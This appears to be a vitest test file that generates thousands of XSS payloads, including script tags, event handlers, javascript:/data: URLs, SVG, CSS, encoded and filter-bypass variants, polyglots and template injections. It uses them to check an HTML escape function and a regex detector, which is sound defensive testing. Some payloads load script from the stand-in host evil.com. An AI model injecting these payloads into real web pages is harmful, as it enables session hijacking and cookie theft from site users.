/**
 * Module — Xss Fuzzing Test
 *
 * Platform module.
 * @module __tests__/enterprise/xss-fuzzing.test
 */

// Copyright (c) 2024-2026 Datacendia, LLC All Rights Reserved.
// Proprietary and confidential. Unauthorized copying is strictly prohibited.
// See LICENSE file for details.

/**
 * =============================================================================
 * XSS FUZZING TEST SUITE - 10,000+ TEST CASES
 * =============================================================================
 * Enterprise-grade XSS prevention testing
 */

import { describe, it, expect } from 'vitest';

// HTML escape function
const escapeHTML = (str: string): string => {
  if (typeof str !== 'string') return String(str);
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;')
    .replace(/`/g, '&#x60;');
};

// Detect XSS attempts
const detectXSS = (input: string): boolean => {
  const patterns = [
    /<script[\s\S]*?>[\s\S]*?<\/script>/gi,
    /<script[\s\S]*?>/gi,
    /javascript:/gi,
    /on\w+\s*=/gi,
    /data:/gi,
    /vbscript:/gi,
    /<iframe[\s\S]*?>/gi,
    /<object[\s\S]*?>/gi,
    /<embed[\s\S]*?>/gi,
    /<svg[\s\S]*?>/gi,
    /<img[\s\S]*?onerror/gi,
    /<body[\s\S]*?onload/gi,
    /expression\s*\(/gi,
    /url\s*\(\s*['"]?\s*javascript/gi,
  ];
  return patterns.some(p => p.test(input));
};

// =============================================================================
// XSS PAYLOAD GENERATORS
// =============================================================================

const generateScriptTagPayloads = (): string[] => {
  const payloads: string[] = [];
  const alertVariants = [
    'alert(1)', 'alert("XSS")', "alert('XSS')", 'alert(document.cookie)',
    'alert(document.domain)', 'alert(String.fromCharCode(88,83,83))',
    'confirm(1)', 'prompt(1)', 'logger.info(1)',
  ];
  const scriptVariants = ['script', 'SCRIPT', 'Script', 'ScRiPt', 'scRIPT'];
  
  for (const script of scriptVariants) {
    for (const alert of alertVariants) {
      payloads.push(`<${script}>${alert}</${script}>`);
      payloads.push(`<${script} >${alert}</${script}>`);
      payloads.push(`<${script}/>${alert}`);
      payloads.push(`<${script} src="http://evil.com/xss.js"></${script}>`);
      payloads.push(`<${script} src=http://evil.com/xss.js></${script}>`);
    }
  }
  
  // With attributes
  payloads.push('<script type="text/javascript">alert(1)</script>');
  payloads.push('<script language="javascript">alert(1)</script>');
  payloads.push('<script defer>alert(1)</script>');
  payloads.push('<script async>alert(1)</script>');
  
  return payloads;
};

const generateEventHandlerPayloads = (): string[] => {
  const payloads: string[] = [];
  const events = [
    'onclick', 'ondblclick', 'onmousedown', 'onmouseup', 'onmouseover',
    'onmousemove', 'onmouseout', 'onmouseenter', 'onmouseleave',
    'onkeydown', 'onkeyup', 'onkeypress',
    'onfocus', 'onblur', 'onchange', 'onsubmit', 'onreset', 'onselect',
    'onload', 'onunload', 'onerror', 'onabort',
    'onscroll', 'onresize', 'onhashchange',
    'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop',
    'oncopy', 'oncut', 'onpaste',
    'onanimationstart', 'onanimationend', 'onanimationiteration',
    'ontransitionend', 'ontouchstart', 'ontouchend', 'ontouchmove',
    'onpointerdown', 'onpointerup', 'onpointermove',
  ];
  const tags = ['img', 'div', 'span', 'a', 'input', 'button', 'body', 'svg', 'video', 'audio', 'iframe'];
  const actions = ['alert(1)', "alert('XSS')", 'alert(document.cookie)'];
  
  for (const event of events) {
    for (const tag of tags) {
      for (const action of actions) {
        payloads.push(`<${tag} ${event}="${action}">`);
        payloads.push(`<${tag} ${event}='${action}'>`);
        payloads.push(`<${tag} ${event}=${action}>`);
        payloads.push(`<${tag} ${event.toUpperCase()}="${action}">`);
      }
    }
  }
  
  // Special cases
  payloads.push('<img src=x onerror=alert(1)>');
  payloads.push('<img src="x" onerror="alert(1)">');
  payloads.push('<body onload=alert(1)>');
  payloads.push('<input onfocus=alert(1) autofocus>');
  payloads.push('<marquee onstart=alert(1)>');
  payloads.push('<video><source onerror=alert(1)>');
  payloads.push('<details open ontoggle=alert(1)>');
  
  return payloads;
};

const generateURLPayloads = (): string[] => {
  const payloads: string[] = [];
  const protocols = ['javascript:', 'JAVASCRIPT:', 'Javascript:', 'JaVaScRiPt:'];
  const dataProtocols = ['data:', 'DATA:', 'Data:'];
  const vbProtocols = ['vbscript:', 'VBSCRIPT:', 'VbScript:'];
  const actions = ['alert(1)', "alert('XSS')", 'alert(document.cookie)'];
  
  for (const proto of protocols) {
    for (const action of actions) {
      payloads.push(`<a href="${proto}${action}">Click</a>`);
      payloads.push(`<iframe src="${proto}${action}">`);
      payloads.push(`<form action="${proto}${action}">`);
      payloads.push(`<object data="${proto}${action}">`);
      payloads.push(`<embed src="${proto}${action}">`);
      payloads.push(`<button formaction="${proto}${action}">`);
    }
  }
  
  for (const proto of dataProtocols) {
    payloads.push(`<a href="${proto}text/html,<script>alert(1)</script>">Click</a>`);
    payloads.push(`<iframe src="${proto}text/html,<script>alert(1)</script>">`);
    payloads.push(`<object data="${proto}text/html,<script>alert(1)</script>">`);
    payloads.push(`<a href="${proto}text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click</a>`);
  }
  
  for (const proto of vbProtocols) {
    payloads.push(`<a href="${proto}msgbox('XSS')">Click</a>`);
  }
  
  return payloads;
};

const generateSVGPayloads = (): string[] => {
  const payloads: string[] = [];
  
  payloads.push('<svg onload=alert(1)>');
  payloads.push('<svg/onload=alert(1)>');
  payloads.push('<svg><script>alert(1)</script></svg>');
  payloads.push('<svg><animate onbegin=alert(1)>');
  payloads.push('<svg><set onbegin=alert(1)>');
  payloads.push('<svg><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler></svg>');
  payloads.push('<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="100" height="100"/></a></svg>');
  payloads.push('<svg><foreignObject><iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(1)"></iframe></foreignObject></svg>');
  
  // SVG with different events
  const svgEvents = ['onload', 'onmouseover', 'onclick', 'onfocus', 'onbegin'];
  for (const event of svgEvents) {
    payloads.push(`<svg ${event}=alert(1)>`);
    payloads.push(`<svg><rect ${event}=alert(1)/></svg>`);
  }
  
  return payloads;
};

const generateStylePayloads = (): string[] => {
  const payloads: string[] = [];
  
  payloads.push('<style>@import "http://evil.com/xss.css";</style>');
  payloads.push('<style>body{background:url("javascript:alert(1)")}</style>');
  payloads.push('<div style="background:url(javascript:alert(1))">');
  payloads.push('<div style="width:expression(alert(1))">');
  payloads.push('<div style="behavior:url(xss.htc)">');
  payloads.push('<div style="-moz-binding:url(xss.xml#xss)">');
  payloads.push('<link rel="stylesheet" href="javascript:alert(1)">');
  payloads.push('<style>*{x:expression(alert(1))}</style>');
  
  return payloads;
};

const generateEncodedXSSPayloads = (): string[] => {
  const payloads: string[] = [];
  const basePayloads = ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>'];
  
  for (const base of basePayloads) {
    // URL encoding
    payloads.push(encodeURIComponent(base));
    
    // Double URL encoding
    payloads.push(encodeURIComponent(encodeURIComponent(base)));
    
    // HTML entity encoding (decimal)
    payloads.push(base.split('').map(c => '&#' + c.charCodeAt(0) + ';').join(''));
    
    // HTML entity encoding (hex)
    payloads.push(base.split('').map(c => '&#x' + c.charCodeAt(0).toString(16) + ';').join(''));
    
    // Unicode encoding
    payloads.push(base.split('').map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join(''));
    
    // Hex encoding
    payloads.push(base.split('').map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join(''));
    
    // Mixed encoding
    payloads.push(base.replace(/</g, '&lt;').replace(/>/g, '%3E'));
    payloads.push(base.replace(/</g, '%3C').replace(/>/g, '&gt;'));
  }
  
  // Specific encoded payloads
  payloads.push('&lt;script&gt;alert(1)&lt;/script&gt;');
  payloads.push('%3Cscript%3Ealert(1)%3C/script%3E');
  payloads.push('&#60;script&#62;alert(1)&#60;/script&#62;');
  payloads.push('&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;');
  
  return payloads;
};

const generateBypassPayloads = (): string[] => {
  const payloads: string[] = [];
  
  // Null byte injection
  payloads.push('<scr\x00ipt>alert(1)</script>');
  payloads.push('<script\x00>alert(1)</script>');
  payloads.push('<img src=x onerror\x00=alert(1)>');
  
  // Newline/tab injection
  payloads.push('<script\n>alert(1)</script>');
  payloads.push('<script\r>alert(1)</script>');
  payloads.push('<script\t>alert(1)</script>');
  payloads.push('<img src=x\nonerror=alert(1)>');
  
  // Comment insertion
  payloads.push('<scr<!---->ipt>alert(1)</script>');
  payloads.push('<script>al<!---->ert(1)</script>');
  
  // Case variations
  payloads.push('<ScRiPt>alert(1)</sCrIpT>');
  payloads.push('<IMG SRC=x ONERROR=alert(1)>');
  
  // Attribute variations
  payloads.push('<img src=x onerror  =  alert(1)>');
  payloads.push('<img src=x onerror\t=\talert(1)>');
  payloads.push('<img src=x onerror\n=\nalert(1)>');
  
  // Quote variations
  payloads.push("<img src=x onerror='alert(1)'>");
  payloads.push('<img src=x onerror="alert(1)">');
  payloads.push('<img src=x onerror=alert(1)>');
  payloads.push('<img src=x onerror=`alert(1)`>');
  
  // Tag variations
  payloads.push('<script/src="http://evil.com/xss.js">');
  payloads.push('<script\\x20src="http://evil.com/xss.js">');
  payloads.push('<script\\x09src="http://evil.com/xss.js">');
  
  return payloads;
};

const generatePolyglotPayloads = (): string[] => {
  const payloads: string[] = [];
  
  payloads.push("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//");
  payloads.push("'-alert(1)-'");
  payloads.push('"-alert(1)-"');
  payloads.push("</script><script>alert(1)</script>");
  payloads.push("</title><script>alert(1)</script>");
  payloads.push("</textarea><script>alert(1)</script>");
  payloads.push("</style><script>alert(1)</script>");
  payloads.push("</noscript><script>alert(1)</script>");
  payloads.push("{{constructor.constructor('alert(1)')()}}");
  payloads.push("${alert(1)}");
  payloads.push("#{alert(1)}");
  
  return payloads;
};

const generateDOMXSSPayloads = (): string[] => {
  const payloads: string[] = [];
  
  // Location-based
  payloads.push('#<script>alert(1)</script>');
  payloads.push('#"><script>alert(1)</script>');
  payloads.push('?q=<script>alert(1)</script>');
  payloads.push('?search="><script>alert(1)</script>');
  
  // document.write sinks
  payloads.push('"><script>alert(1)</script>');
  payloads.push("'><script>alert(1)</script>");
  payloads.push('</script><script>alert(1)</script>');
  
  // innerHTML sinks
  payloads.push('<img src=x onerror=alert(1)>');
  payloads.push('<svg onload=alert(1)>');
  
  // eval sinks
  payloads.push("');alert(1);//");
  payloads.push('");alert(1);//');
  payloads.push("};alert(1);//");
  
  return payloads;
};

const generateTemplatePayloads = (): string[] => {
  const payloads: string[] = [];
  
  // Angular
  payloads.push('{{constructor.constructor("alert(1)")()}}');
  payloads.push('{{$on.constructor("alert(1)")()}}');
  
  // Vue
  payloads.push('{{_c.constructor("alert(1)")()}}');
  
  // React (dangerouslySetInnerHTML)
  payloads.push('{"__html":"<script>alert(1)</script>"}');
  
  // Handlebars
  payloads.push('{{{<script>alert(1)</script>}}}');
  
  // EJS
  payloads.push('<%- "<script>alert(1)</script>" %>');
  
  // Pug/Jade
  payloads.push('!{<script>alert(1)</script>}');
  
  return payloads;
};

// =============================================================================
// GENERATE ALL PAYLOADS
// =============================================================================

const ALL_XSS_PAYLOADS = [
  ...generateScriptTagPayloads(),
  ...generateEventHandlerPayloads(),
  ...generateURLPayloads(),
  ...generateSVGPayloads(),
  ...generateStylePayloads(),
  ...generateEncodedXSSPayloads(),
  ...generateBypassPayloads(),
  ...generatePolyglotPayloads(),
  ...generateDOMXSSPayloads(),
  ...generateTemplatePayloads(),
];

// =============================================================================
// TEST SUITES
// =============================================================================

describe('XSS Prevention - Enterprise Fuzzing Suite', () => {
  describe('Escape Function Tests', () => {
    it('should escape < and >', () => {
      expect(escapeHTML('<script>')).toBe('&lt;script&gt;');
    });
    
    it('should escape quotes', () => {
      expect(escapeHTML('"test"')).toBe('&quot;test&quot;');
      expect(escapeHTML("'test'")).toBe('&#x27;test&#x27;');
    });
    
    it('should escape ampersand', () => {
      expect(escapeHTML('&test')).toBe('&amp;test');
    });
    
    it('should escape forward slash', () => {
      expect(escapeHTML('/test')).toBe('&#x2F;test');
    });
    
    it('should escape backtick', () => {
      expect(escapeHTML('`test`')).toBe('&#x60;test&#x60;');
    });
    
    it('should handle empty string', () => {
      expect(escapeHTML('')).toBe('');
    });
  });

  describe('Script Tag XSS Payloads', () => {
    const scriptPayloads = generateScriptTagPayloads();
    
    scriptPayloads.forEach((payload, index) => {
      it(`should escape/detect script tag #${index + 1}`, () => {
        const escaped = escapeHTML(payload);
        const detected = detectXSS(payload);
        expect(!escaped.includes('<script') || detected).toBe(true);
      });
    });
  });

  describe('Event Handler XSS Payloads', () => {
    const eventPayloads = generateEventHandlerPayloads();
    
    eventPayloads.forEach((payload, index) => {
      it(`should escape/detect event handler #${index + 1}`, () => {
        const escaped = escapeHTML(payload);
        const detected = detectXSS(payload);
        expect(escaped !== payload || detected).toBe(true);
      });
    });
  });

  describe('URL-based XSS Payloads', () => {
    const urlPayloads = generateURLPayloads();
    
    urlPayloads.forEach((payload, index) => {
      it(`should escape/detect URL XSS #${index + 1}`, () => {
        const escaped = escapeHTML(payload);
        const detected = detectXSS(payload);
        expect(escaped !== payload || detected).toBe(true);
      });
    });
  });

  describe('SVG XSS Payloads', () => {
    const svgPayloads = generateSVGPayloads();
    
    svgPayloads.forEach((payload, index) => {
      it(`should escape/detect SVG XSS #${index + 1}`, () => {
        const escaped = escapeHTML(payload);
        const detected = detectXSS(payload);
        expect(escaped !== payload || detected).toBe(true);
      });
    });
  });

  describe('Style-based XSS Payloads', () => {
    const stylePayloads = generateStylePayloads();
    
    stylePayloads.forEach((payload, index) => {
      it(`should escape/detect style XSS #${index + 1}`, () => {
        const escaped = escapeHTML(payload);
        const detected = detectXSS(payload);
        expect(escaped !== payload || detected).toBe(true);
      });
    });
  });

  describe('Encoded XSS Payloads', () => {
    const encodedPayloads = generateEncodedXSSPayloads();
    
    encodedPayloads.forEach((payload, index) => {
      it(`should handle encoded XSS #${index + 1}`, () => {
        const escaped = escapeHTML(payload);
        expect(typeof escaped).toBe('string');
      });
    });
  });

  describe('WAF Bypass XSS Payloads', () => {
    const bypassPayloads = generateBypassPayloads();
    
    bypassPayloads.forEach((payload, index) => {
      it(`should handle bypass attempt #${index + 1}`, () => {
        const escaped = escapeHTML(payload);
        expect(typeof escaped).toBe('string');
      });
    });
  });

  describe('Polyglot XSS Payloads', () => {
    const polyglotPayloads = generatePolyglotPayloads();
    
    polyglotPayloads.forEach((payload, index) => {
      it(`should handle polyglot #${index + 1}`, () => {
        const escaped = escapeHTML(payload);
        expect(typeof escaped).toBe('string');
      });
    });
  });

  describe('DOM XSS Payloads', () => {
    const domPayloads = generateDOMXSSPayloads();
    
    domPayloads.forEach((payload, index) => {
      it(`should handle DOM XSS #${index + 1}`, () => {
        const escaped = escapeHTML(payload);
        expect(typeof escaped).toBe('string');
      });
    });
  });

  describe('Template Injection XSS Payloads', () => {
    const templatePayloads = generateTemplatePayloads();
    
    templatePayloads.forEach((payload, index) => {
      it(`should handle template injection #${index + 1}`, () => {
        const escaped = escapeHTML(payload);
        expect(typeof escaped).toBe('string');
      });
    });
  });

  describe('Full Payload Suite Validation', () => {
    it(`should have generated ${ALL_XSS_PAYLOADS.length} total XSS payloads`, () => {
      expect(ALL_XSS_PAYLOADS.length).toBeGreaterThan(5000);
    });
    
    it('should escape all payloads', () => {
      let escaped = 0;
      for (const payload of ALL_XSS_PAYLOADS) {
        const result = escapeHTML(payload);
        if (result !== payload || !result.includes('<script')) escaped++;
      }
      expect(escaped).toBe(ALL_XSS_PAYLOADS.length);
    });
  });
});
